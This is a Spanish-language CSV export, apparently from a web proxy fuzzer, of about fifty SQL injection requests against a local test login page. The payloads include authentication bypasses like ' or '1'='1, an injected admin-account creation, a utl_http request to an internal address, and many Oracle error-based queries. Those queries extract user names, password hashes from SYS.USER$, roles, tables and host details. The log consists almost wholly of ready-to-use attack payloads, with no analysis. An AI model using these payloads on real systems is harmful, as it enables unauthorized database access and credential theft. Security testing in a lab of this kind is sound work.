Identificación de pestaña,Tipo de mensaje,Petición (Tiempo),Método,URL,Código,Razón,RTT,Tamaño de la Cabecera de Pregunta,Tamaño Cuerpo de Petición,Tamaño de la Cabecera de Respuesta,Respuesta (Tamaño del cuerpo),Alerta mayor,Estado,Cargas Útiles
156,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(granted_role)%20FROM%20(SELECT%20DISTINCT(granted_role),%20ROWNUM%20AS%20LIMIT%20FROM%20dba_role_privs%20WHERE%20GRANTEE=SYS.LOGINUSER)%20WHERE%20LIMIT=8))%20AND%20'i'='i&password=prueba",200,OK,8,679,0,227,510,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i]"
157,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=%20or%201=1&password=prueba,200,OK,16,461,0,227,345,,,[ or 1=1]
155,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(column_name)%20FROM%20(SELECT%20DISTINCT(column_name),%20ROWNUM%20AS%20LIMIT%20FROM%20all_tab_columns)%20WHERE%20LIMIT=8))%20AND%20'i'='i&password=prueba",200,OK,19,646,0,227,507,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i]"
154,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(table_name)%20FROM%20(SELECT%20DISTINCT(table_name),%20ROWNUM%20AS%20LIMIT%20FROM%20sys.all_tables)%20WHERE%20LIMIT=8))%20AND%20'i'='i&password=prueba",200,OK,11,643,0,227,506,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i]"
160,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20%7C%7C%20myappadmin.adduser('admin',%20'newpass')%20%7C%7C%20'&password=prueba",200,OK,7,516,0,227,364,,,"[' || myappadmin.adduser('admin', 'newpass') || ']"
158,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20'1'='1&password=prueba,200,OK,13,465,0,227,345,,,[' or '1'='1]
159,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%7C%7Cutl_http.request('httP://192.168.1.1/')%7C%7C'&password=prueba,200,OK,18,503,0,227,362,,,['||utl_http.request('httP://192.168.1.1/')||']
161,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20banner%20FROM%20v$version%20WHERE%20ROWNUM=1))%20AND%20'i'='i&password=prueba,200,OK,15,561,0,227,323,,,[' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i]
163,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20SYS.DATABASE_NAME%20FROM%20DUAL))%20AND%20'i'='i&password=prueba,200,OK,21,548,0,227,373,,,[' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i]
162,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20SYS.LOGIN_USER%20FROM%20DUAL))%20AND%20'i'='i&password=prueba,200,OK,30,545,0,227,373,,,[' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i]
164,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20host_name%20FROM%20v$instance))%20AND%20'i'='i&password=prueba,200,OK,26,546,0,227,324,,,[' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i]
165,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20global_name%20FROM%20global_name))%20AND%20'i'='i&password=prueba,200,OK,16,549,0,227,325,,,[' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i]
166,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20COUNT(DISTINCT(USERNAME))%20FROM%20SYS.ALL_USERS))%20AND%20'i'='i&password=prueba,200,OK,18,565,0,227,358,,,[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i]
167,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20COUNT(DISTINCT(PASSWORD))%20FROM%20SYS.USER$))%20AND%20'i'='i&password=prueba,200,OK,7,561,0,227,354,,,[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i]
170,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20COUNT(DISTINCT(GRANTED_ROLE))%20FROM%20DBA_ROLE_PRIVS%20WHERE%20GRANTEE=SYS.LOGIN_USER))%20AND%20'i'='i&password=prueba,200,OK,15,603,0,227,328,,,[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i]
168,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20COUNT(DISTINCT(table_name))%20FROM%20sys.all_tables))%20AND%20'i'='i&password=prueba,200,OK,12,568,0,227,359,,,[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i]
169,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20COUNT(DISTINCT(column_name))%20FROM%20sys.all_tab_columns))%20AND%20'i'='i&password=prueba,200,OK,21,574,0,227,364,,,[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i]
172,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(PASSWORD)%20FROM%20(SELECT%20DISTINCT(PASSWORD),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.USER$)%20WHERE%20LIMIT=1))%20AND%20'i'='i&password=prueba",200,OK,6,634,0,227,501,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i]"
171,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(USERNAME)%20FROM%20(SELECT%20DISTINCT(USERNAME),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_USERS)%20WHERE%20LIMIT=1))%20AND%20'i'='i&password=prueba",200,OK,24,638,0,227,505,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i]"
173,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(table_name)%20FROM%20(SELECT%20DISTINCT(table_name),%20ROWNUM%20AS%20LIMIT%20FROM%20sys.all_tables)%20WHERE%20LIMIT=1))%20AND%20'i'='i&password=prueba",200,OK,3,643,0,227,506,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i]"
176,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(USERNAME)%20FROM%20(SELECT%20DISTINCT(USERNAME),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_USERS)%20WHERE%20LIMIT=2))%20AND%20'i'='i&password=prueba",200,OK,8,638,0,227,505,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i]"
174,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(column_name)%20FROM%20(SELECT%20DISTINCT(column_name),%20ROWNUM%20AS%20LIMIT%20FROM%20all_tab_columns)%20WHERE%20LIMIT=1))%20AND%20'i'='i&password=prueba",200,OK,15,646,0,227,507,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i]"
179,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(column_name)%20FROM%20(SELECT%20DISTINCT(column_name),%20ROWNUM%20AS%20LIMIT%20FROM%20all_tab_columns)%20WHERE%20LIMIT=2))%20AND%20'i'='i&password=prueba",200,OK,7,646,0,227,507,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i]"
177,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(PASSWORD)%20FROM%20(SELECT%20DISTINCT(PASSWORD),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.USER$)%20WHERE%20LIMIT=2))%20AND%20'i'='i&password=prueba",200,OK,8,634,0,227,501,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i]"
178,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(table_name)%20FROM%20(SELECT%20DISTINCT(table_name),%20ROWNUM%20AS%20LIMIT%20FROM%20sys.all_tables)%20WHERE%20LIMIT=2))%20AND%20'i'='i&password=prueba",200,OK,8,643,0,227,506,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i]"
175,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(granted_role)%20FROM%20(SELECT%20DISTINCT(granted_role),%20ROWNUM%20AS%20LIMIT%20FROM%20dba_role_privs%20WHERE%20GRANTEE=SYS.LOGINUSER)%20WHERE%20LIMIT=1))%20AND%20'i'='i&password=prueba",200,OK,17,679,0,227,510,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i]"
181,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(USERNAME)%20FROM%20(SELECT%20DISTINCT(USERNAME),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_USERS)%20WHERE%20LIMIT=3))%20AND%20'i'='i&password=prueba",200,OK,9,638,0,227,505,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i]"
183,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(table_name)%20FROM%20(SELECT%20DISTINCT(table_name),%20ROWNUM%20AS%20LIMIT%20FROM%20sys.all_tables)%20WHERE%20LIMIT=3))%20AND%20'i'='i&password=prueba",200,OK,16,643,0,227,506,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i]"
180,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(granted_role)%20FROM%20(SELECT%20DISTINCT(granted_role),%20ROWNUM%20AS%20LIMIT%20FROM%20dba_role_privs%20WHERE%20GRANTEE=SYS.LOGINUSER)%20WHERE%20LIMIT=2))%20AND%20'i'='i&password=prueba",200,OK,10,679,0,227,510,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i]"
182,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(PASSWORD)%20FROM%20(SELECT%20DISTINCT(PASSWORD),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.USER$)%20WHERE%20LIMIT=3))%20AND%20'i'='i&password=prueba",200,OK,12,634,0,227,501,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i]"
185,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(granted_role)%20FROM%20(SELECT%20DISTINCT(granted_role),%20ROWNUM%20AS%20LIMIT%20FROM%20dba_role_privs%20WHERE%20GRANTEE=SYS.LOGINUSER)%20WHERE%20LIMIT=3))%20AND%20'i'='i&password=prueba",200,OK,8,679,0,227,510,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i]"
186,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(USERNAME)%20FROM%20(SELECT%20DISTINCT(USERNAME),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_USERS)%20WHERE%20LIMIT=4))%20AND%20'i'='i&password=prueba",200,OK,11,638,0,227,505,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i]"
184,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(column_name)%20FROM%20(SELECT%20DISTINCT(column_name),%20ROWNUM%20AS%20LIMIT%20FROM%20all_tab_columns)%20WHERE%20LIMIT=3))%20AND%20'i'='i&password=prueba",200,OK,14,646,0,227,507,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i]"
189,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(column_name)%20FROM%20(SELECT%20DISTINCT(column_name),%20ROWNUM%20AS%20LIMIT%20FROM%20all_tab_columns)%20WHERE%20LIMIT=4))%20AND%20'i'='i&password=prueba",200,OK,5,646,0,227,507,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i]"
187,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(PASSWORD)%20FROM%20(SELECT%20DISTINCT(PASSWORD),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.USER$)%20WHERE%20LIMIT=4))%20AND%20'i'='i&password=prueba",200,OK,8,634,0,227,501,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i]"
190,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(granted_role)%20FROM%20(SELECT%20DISTINCT(granted_role),%20ROWNUM%20AS%20LIMIT%20FROM%20dba_role_privs%20WHERE%20GRANTEE=SYS.LOGINUSER)%20WHERE%20LIMIT=4))%20AND%20'i'='i&password=prueba",200,OK,9,679,0,227,510,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i]"
191,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(USERNAME)%20FROM%20(SELECT%20DISTINCT(USERNAME),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_USERS)%20WHERE%20LIMIT=5))%20AND%20'i'='i&password=prueba",200,OK,8,638,0,227,505,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i]"
188,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(table_name)%20FROM%20(SELECT%20DISTINCT(table_name),%20ROWNUM%20AS%20LIMIT%20FROM%20sys.all_tables)%20WHERE%20LIMIT=4))%20AND%20'i'='i&password=prueba",200,OK,8,643,0,227,506,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i]"
192,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(PASSWORD)%20FROM%20(SELECT%20DISTINCT(PASSWORD),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.USER$)%20WHERE%20LIMIT=5))%20AND%20'i'='i&password=prueba",200,OK,14,634,0,227,501,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i]"
193,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(table_name)%20FROM%20(SELECT%20DISTINCT(table_name),%20ROWNUM%20AS%20LIMIT%20FROM%20sys.all_tables)%20WHERE%20LIMIT=5))%20AND%20'i'='i&password=prueba",200,OK,9,643,0,227,506,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i]"
194,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(column_name)%20FROM%20(SELECT%20DISTINCT(column_name),%20ROWNUM%20AS%20LIMIT%20FROM%20all_tab_columns)%20WHERE%20LIMIT=5))%20AND%20'i'='i&password=prueba",200,OK,12,646,0,227,507,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i]"
196,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(USERNAME)%20FROM%20(SELECT%20DISTINCT(USERNAME),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_USERS)%20WHERE%20LIMIT=6))%20AND%20'i'='i&password=prueba",200,OK,11,638,0,227,505,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i]"
195,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(granted_role)%20FROM%20(SELECT%20DISTINCT(granted_role),%20ROWNUM%20AS%20LIMIT%20FROM%20dba_role_privs%20WHERE%20GRANTEE=SYS.LOGINUSER)%20WHERE%20LIMIT=5))%20AND%20'i'='i&password=prueba",200,OK,18,679,0,227,510,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i]"
198,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(table_name)%20FROM%20(SELECT%20DISTINCT(table_name),%20ROWNUM%20AS%20LIMIT%20FROM%20sys.all_tables)%20WHERE%20LIMIT=6))%20AND%20'i'='i&password=prueba",200,OK,16,643,0,227,506,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i]"
197,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(PASSWORD)%20FROM%20(SELECT%20DISTINCT(PASSWORD),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.USER$)%20WHERE%20LIMIT=6))%20AND%20'i'='i&password=prueba",200,OK,22,634,0,227,501,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i]"
199,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(column_name)%20FROM%20(SELECT%20DISTINCT(column_name),%20ROWNUM%20AS%20LIMIT%20FROM%20all_tab_columns)%20WHERE%20LIMIT=6))%20AND%20'i'='i&password=prueba",200,OK,15,646,0,227,507,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i]"
200,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(granted_role)%20FROM%20(SELECT%20DISTINCT(granted_role),%20ROWNUM%20AS%20LIMIT%20FROM%20dba_role_privs%20WHERE%20GRANTEE=SYS.LOGINUSER)%20WHERE%20LIMIT=6))%20AND%20'i'='i&password=prueba",200,OK,7,679,0,227,510,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i]"
203,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(table_name)%20FROM%20(SELECT%20DISTINCT(table_name),%20ROWNUM%20AS%20LIMIT%20FROM%20sys.all_tables)%20WHERE%20LIMIT=7))%20AND%20'i'='i&password=prueba",200,OK,4,643,0,227,506,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i]"
202,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(PASSWORD)%20FROM%20(SELECT%20DISTINCT(PASSWORD),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.USER$)%20WHERE%20LIMIT=7))%20AND%20'i'='i&password=prueba",200,OK,10,634,0,227,501,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i]"
